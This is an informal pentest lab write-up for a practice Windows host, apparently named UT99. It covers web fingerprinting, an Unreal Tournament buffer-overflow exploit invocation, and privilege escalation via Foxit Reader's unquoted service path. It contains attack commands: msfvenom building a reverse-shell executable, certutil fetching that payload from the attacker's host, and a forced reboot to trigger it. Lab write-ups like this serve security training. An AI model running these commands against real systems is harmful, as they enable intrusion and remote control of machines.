@@ -1,0 +1,274 @@
+UT99 Writeup
+
+Immediately upon opening the website we see a public_html jaunt
+That thing has led us to a website
+
+I am shit a these pentests so lets walkthrough
+
+they use a tool named whatweb to see the server is running Apache 2.4.16 on 32 bit windows host
+put this into toolkit
+
+whatweb http://192.168.131.44 -v
+
+Amazing output, check screencap
+
+ummary   : Apache[2.4.16], HTTPServer[Windows (32 bit)][Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12], Index-Of, OpenSSL[1.0.1p], PHP[5.6.12]
+
+Detected Plugins:
+[ Apache ]
+        The Apache HTTP Server Project is an effort to develop and 
+        maintain an open-source HTTP server for modern operating 
+        systems including UNIX and Windows NT. The goal of this 
+        project is to provide a secure, efficient and extensible 
+        server that provides HTTP services in sync with the current 
+        HTTP standards. 
+
+        Version      : 2.4.16 (from HTTP Server Header)
+        Google Dorks: (3)
+        Website     : http://httpd.apache.org/
+
+[ HTTPServer ]
+        HTTP server header string. This plugin also attempts to 
+        identify the operating system from the server header. 
+
+        OS           : Windows (32 bit)
+        String       : Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12 (from server string)
+
+[ Index-Of ]
+        Index of 
+
+        Google Dorks: (1)
+
+[ OpenSSL ]
+        The OpenSSL Project is a collaborative effort to develop a 
+        robust, commercial-grade, full-featured, and Open Source 
+        toolkit implementing the Secure Sockets Layer (SSL v2/v3) 
+        and Transport Layer Security (TLS v1) protocols as well as 
+        a full-strength general purpose cryptography library. 
+
+        Version      : 1.0.1p
+        Website     : http://www.openssl.org/
+
+[ PHP ]
+        PHP is a widely-used general-purpose scripting language 
+        that is especially suited for Web development and can be 
+        embedded into HTML. This plugin identifies PHP errors, 
+        modules and versions and extracts the local file path and 
+        username if present. 
+
+        Version      : 5.6.12
+        Google Dorks: (2)
+        Website     : http://www.php.net/
+
+HTTP Headers:
+        HTTP/1.1 200 OK
+        Date: Sat, 03 Dec 2022 18:30:48 GMT
+        Server: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
+        Content-Length: 796
+        Connection: close
+        Content-Type: text/html;charset=UTF-8
+
+
+FLUID INTELLIGENCE EXAMPLE: SEARCH FOR IRC, WHAT IS IRC
+
+Internet Relay Chat (IRC) is a text-based chat system for instant messaging. 
+IRC is designed for group communication in discussion forums, called channels,[1] but 
+also allows one-on-one communication via private messages[2] as well as chat and data transfer,
+[3] including file sharing.[4]
+
+
+
+
+The walkthrough says to get HexChat for IRC
+
+Hexchat is an IRC Client that forked from XChat.
+
+
+Configure by adding a network and connefct, we are in
+
+
+Lesson Learned: IF YOU STUMBLE UPON AN APP, CONFIGURE AND ENUMERATE THE APP BOI
+
+
+Searching for Unreal Tournament 99 exploits for Windows on exploit-db shows the following:
+
+Remote Buffer Overflow exploit via Exploit DB
+
+Is it just run?
+
+
+unreal_tournament-bof-win.pl <host> <query port> <reverse ip> <reverse port>
+
+we are in.....
+
+grabbed local
+
+INTERNAL ENUMERATION:
+
+went to ftp and found
+
+ Directory of C:\ftp
+
+10/07/2015  05:21 AM    <DIR>          .
+10/07/2015  05:21 AM    <DIR>          ..
+10/07/2015  12:44 PM        35,984,520 FoxitReader706.1126_enu_Setup.exe
+10/07/2015  03:46 AM        35,922,892 KB968930.msu
+10/07/2015  12:45 PM       114,238,280 xampp-win32-5.6.12-0-VC11-installer.exe
+               3 File(s)    186,145,692 bytes
+               2 Dir(s)  13,049,384,960 bytes free
+
+
+
+
+Foxit Reader on searchsploit yields 
+
+zsh: corrupt history file /home/kali/.zsh_history
+┌──(kali㉿kali)-[~]
+└─$ sudo searchsploit -w Foxit Reader 7.0.6.1126
+[sudo] password for kali: 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+ Exploit Title                                                                                                                                                                                |  URL
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+Foxit Reader 7.0.6.1126 - Unquoted Service Path Privilege Escalation                                                                                                                          | https://www.exploit-db.com/exploits/36390
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+
+So we check the program files to see if it is an actual jaunt installed, it is
+
+We them want to see if it is running via the system
+
+sc qc FoxitCloudUpdateService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: FoxitCloudUpdateService
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Foxit Cloud Safe Update Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+it is
+
+
+move to the foxit software then reader path and see if i can echo a file into it
+
+
+C:\Program Files (x86)\Foxit Software\Foxit Reader>echo hello > ben.txt
+echo hello > ben.txt
+
+C:\Program Files (x86)\Foxit Software\Foxit Reader>dir
+dir
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Program Files (x86)\Foxit Software\Foxit Reader
+
+12/03/2022  11:00 AM    <DIR>          .
+12/03/2022  11:00 AM    <DIR>          ..
+11/26/2014  05:03 PM           385,248 64BitMailAgent.exe
+10/07/2015  03:04 AM    <DIR>          Advertisement
+12/03/2022  11:00 AM                 9 beaner.txt
+10/07/2015  03:04 AM    <DIR>          docusign
+10/07/2015  03:05 AM    <DIR>          Foxit Cloud
+11/27/2014  09:24 AM        42,164,448 FoxitReader.exe
+11/27/2014  02:49 PM            74,588 FoxitReader.exe.man
+11/26/2014  05:03 PM         4,856,544 FoxitUpdater.exe
+11/26/2014  06:15 PM         1,621,728 FXCUSTOM.dll
+10/07/2015  03:04 AM    <DIR>          lex
+08/28/2014  09:25 AM            27,076 notice.txt
+10/07/2015  03:04 AM    <DIR>          plugins
+10/07/2015  03:04 AM    <DIR>          Release Note
+11/26/2014  05:03 PM         2,093,280 SendCrashReport.exe
+10/07/2015  03:04 AM    <DIR>          Shell Extensions
+10/07/2015  03:04 AM    <DIR>          Skins
+10/07/2015  03:04 AM    <DIR>          stamps
+10/07/2015  03:04 AM    <DIR>          Start
+11/26/2014  06:07 PM         2,302,176 TrackReview.exe
+10/07/2015  03:05 AM           278,490 unins000.dat
+10/07/2015  03:02 AM         1,479,392 unins000.exe
+10/07/2015  03:05 AM            22,701 unins000.msg
+11/18/2014  03:38 PM         2,004,704 UninstallPrint.exe
+10/07/2015  03:05 AM             1,270 UpdaterInfo.xml
+              14 File(s)     57,311,654 bytes
+              12 Dir(s)  13,049,372,672 bytes free
+
+C:\Program Files (x86)\Foxit Software\Foxit Reader>type ben.txt
+type ben.txt
+hello
+
+C:\Program Files (x86)\Foxit Software\Foxit Reader>
+
+
+I can lol
+
+now to use msfvenopm
+IN YOUR HOME DIRECTORY:
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.131 LPORT=80 -f exe -o Foxit.exe
+
+THEN GET USING WINDOWS MACHINE VIA
+
+certutil.exe -f -urlcache -split http://192.168.49.131/Foxit.exe
+MAKE A PYTHON SERVER WEENIE
+
+shutdown machine via
+
+shutdown.exe -r -f -t 1
+
+
+We have a shell!
+
+
+ Directory of C:\Users\fluffy
+
+11/12/2015  04:39 AM    <DIR>          .
+11/12/2015  04:39 AM    <DIR>          ..
+10/01/2015  04:23 AM    <DIR>          Contacts
+12/22/2020  04:17 AM    <DIR>          Desktop
+10/03/2015  01:18 AM    <DIR>          Documents
+10/07/2015  05:21 AM    <DIR>          Downloads
+10/01/2015  04:23 AM    <DIR>          Favorites
+10/07/2015  04:39 AM    <DIR>          Links
+09/30/2015  10:44 PM            37,888 murmur.sqlite
+10/01/2015  04:23 AM    <DIR>          Music
+10/01/2015  04:23 AM    <DIR>          Pictures
+10/01/2015  04:23 AM    <DIR>          Saved Games
+10/01/2015  04:23 AM    <DIR>          Searches
+10/01/2015  04:23 AM    <DIR>          Videos
+               1 File(s)         37,888 bytes
+              13 Dir(s)  13,057,191,936 bytes free
+
+C:\Users\fluffy>cd Desktop
+cd Desktop
+
+C:\Users\fluffy\Desktop>dir
+dir
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+
+ Directory of C:\Users\fluffy\Desktop
+
+12/22/2020  04:17 AM    <DIR>          .
+12/22/2020  04:17 AM    <DIR>          ..
+10/03/2015  01:17 AM               762 HexChat (x64).lnk
+10/03/2015  01:34 AM               774 inspircd.lnk
+09/30/2015  10:01 PM               838 Mumble.lnk
+09/30/2015  10:01 PM             1,860 Murmur.lnk
+12/03/2022  10:22 AM                34 proof.txt
+10/06/2015  09:14 AM             1,622 Start UT Server (Looped).lnk
+09/30/2015  09:59 PM               586 XAMPP Control Panel.lnk
+09/30/2015  09:59 PM               507 XAMPP htdocs folder.lnk
+               8 File(s)          6,983 bytes
+               2 Dir(s)  13,057,191,936 bytes free
+
+C:\Users\fluffy\Desktop>type proof.txt
+type proof.txt
+
+
